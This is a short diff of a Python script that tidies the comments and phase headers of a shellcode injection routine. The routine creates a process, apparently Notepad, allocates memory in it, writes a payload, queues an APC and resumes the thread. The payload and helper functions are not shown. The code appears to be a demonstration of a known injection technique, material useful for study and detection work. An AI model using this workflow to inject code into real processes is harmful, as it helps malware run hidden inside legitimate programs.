@@ -396,41 +396,29 @@ def resume_orig_process(
 ##### Main functionality starts here #####
 ##########################################
 
-
-# create target process <- return handle/Ids to thread/process
+# --------------- Create ---------------
 hThread, hProcess, dwThreadId, dwProcessId = create_process()
 
 
-# ------------------------------------------------------
-hdr = "\n >>>>    Phase: Memory Manipulation    <<<<\n"
-print_hdr(hdr)
-
-# allocate memory
+# --------------- Allocate ---------------
+print_hdr("\n >>>>    Phase: Memory Manipulation    <<<<\n")
 lpBaseAddress = virtual_alloc_ex(hProcess, len(payload))
 
-# write payload into allocated memory
+
+# --------------- Write ---------------
 write_payload_shellcode(hProcess, lpBaseAddress, payload)
-
-
-# ------------------------------------------------------
-hdr = "\n >>>>    Phase: Execution    <<<<\n"
-print_hdr(hdr)
-
-# queue APC
 add_to_apc_queue(lpBaseAddress, hThread)
 
-# confirm execution of payload
 pause(warning=True)
 
-# resume execution of original thread/process
+
+# --------------- Execute ---------------
+print_hdr("\n >>>>    Phase: Execution    <<<<\n")
 resume_orig_process(hThread, dwThreadId, dwProcessId)
 
 
-# ------------------------------------------------------
-hdr = "\n >>>>    Phase: Clean-up    <<<<\n"
-print_hdr(hdr)
-
-# close all handles
+# --------------- Clean up ---------------
+print_hdr("\n >>>>    Phase: Clean-up    <<<<\n")
 print()
 close_handle(hThread, "Notepad Thread")
 close_handle(hProcess, "Notepad Process")
